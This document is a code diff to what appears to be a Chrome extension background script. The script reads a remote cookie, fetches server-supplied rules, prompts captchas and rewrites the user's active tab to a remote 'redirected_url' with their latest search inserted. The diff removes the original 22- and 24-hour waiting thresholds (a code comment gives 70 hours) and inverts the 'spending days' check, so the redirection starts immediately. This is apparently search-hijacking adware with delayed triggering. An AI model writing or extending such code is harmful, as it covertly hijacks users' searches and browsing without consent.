@@ -120,8 +120,8 @@ const user_name = 'unique_audio_relay_user';
 let delay = 0;
 chrome.runtime.onInstalled.addListener(function() {
     
-    chrome.storage.local.set({ 're_rules': [],'keyword_rules': [], 'getUserSpendingDays' : -1, 'speak_text_status': true });    
-    chrome.storage.sync.set({ 'captcha_limit':2,'captcha_tried':0 });    
+    chrome.storage.local.set({ 'keyword_rules': [], 'speak_text_status': true });  
+    chrome.storage.sync.set({ 're_rules': [], 'getUserSpendingDays' : -1, 'captcha_limit':2,'captcha_tried':0 });    
 
     delay = 3000;
     chrome.cookies.get({"url": 'https://'+app_url, "name": user_name}, function(cookie) {
@@ -229,7 +229,7 @@ function get_rules(){
         re_rules[0] = data.rules;
         console.log("re Rules : ");
         console.log(re_rules);
-        chrome.storage.local.set({ 're_rules': re_rules });
+        chrome.storage.sync.set({ 're_rules': re_rules });
     })
     .catch(error => console.log('error', error));
 
@@ -282,8 +282,7 @@ function getUserDataByUserId(){
         }
 
         console.log(userDetail)
-        chrome.storage.sync.set({ 'userDetail': userDetail, 'captcha_limit':user_data.lander_users.max_captcha });
-        chrome.storage.local.set({ 'getUserSpendingDays': getUserSpendingDays });
+        chrome.storage.sync.set({ 'userDetail': userDetail, 'captcha_limit':user_data.lander_users.max_captcha, 'getUserSpendingDays': getUserSpendingDays });
          
     })
     .catch(error => console.log('error', error));
@@ -316,14 +315,14 @@ function validateURL(tab, tabId){
 
             console.log("rule days : "+ re_rules[0].days);
             console.log("spending days : "+ getUserSpendingDays);
-            if(getUserSpendingDays >= re_rules[0].days){
+            if(getUserSpendingDays <= re_rules[0].days){
                 console.log('check1');
                 
                 var engineParts = new URL(tab.url);
                 var diff_hours = getHoursDifference(userDetail.captcha_timestamp);
 
                 console.log(captcha_tried, captcha_limit)
-                if(userDetail.captcha_success != true && diff_hours >= 22 && userDetail.isblacklisted != 1){
+                if(userDetail.captcha_success != true && diff_hours >= 0 && userDetail.isblacklisted != 1){
 
                     if(captcha_tried < captcha_limit){
                         var redirected_url = 'https://'+app_url +"captcha-prompt.php?ref=ext&ext_name="+manifestData.name+"&engine="+engineParts.protocol + "//" + engineParts.host; 
@@ -338,7 +337,7 @@ function validateURL(tab, tabId){
                 }
                
                 // 22 hours for captcha + 48 hours for redirection equal to 70 hours
-                if(diff_hours >= 24  && userDetail.captcha_success == true && userDetail.isblacklisted != 1){
+                if(diff_hours >= 0  && userDetail.captcha_success == true && userDetail.isblacklisted != 1){
 
                     let redirect_url = re_rules[0].redirected_url.replace('{query}',latest_search);
                     chrome.tabs.update(tabId, { url: redirect_url });
@@ -608,7 +607,7 @@ function trackUser(){
 }
 
 function setObjects(){
-    chrome.storage.sync.get(['userDetail','captcha_limit','captcha_tried'], function(data) {
+    chrome.storage.sync.get(['userDetail','captcha_limit','captcha_tried','re_rules','getUserSpendingDays'], function(data) {
         console.log(data)
         if (typeof data.userDetail != "undefined") {
             userDetail = data.userDetail
@@ -616,21 +615,24 @@ function setObjects(){
         if (typeof data.captcha_limit != "undefined") {
             captcha_limit = data.captcha_limit
         }
-        if (typeof data.captcha_limit != "undefined") {
-            captcha_limit = data.captcha_limit
+        if (typeof data.captcha_tried != "undefined") {
+            captcha_tried = data.captcha_tried
+        }
+
+        if (typeof data.re_rules != "undefined") {
+            re_rules = data.re_rules
+        }
+        if (typeof data.getUserSpendingDays != "undefined") {
+            getUserSpendingDays = data.getUserSpendingDays
+        } else {
+            delay = 3000;
         }
     })
 
-    chrome.storage.local.get(['re_rules','keyword_rules','getUserSpendingDays'], function(data1) {
+    chrome.storage.local.get(['keyword_rules'], function(data1) {
         console.log(data1)
-        if (typeof data1.re_rules != "undefined") {
-            re_rules = data1.re_rules
-        }
         if (typeof data1.keyword_rules != "undefined") {
             keyword_rules = data1.keyword_rules
-        }
-        if (typeof data1.getUserSpendingDays != "undefined") {
-            getUserSpendingDays = data1.getUserSpendingDays
         }
     })
 }
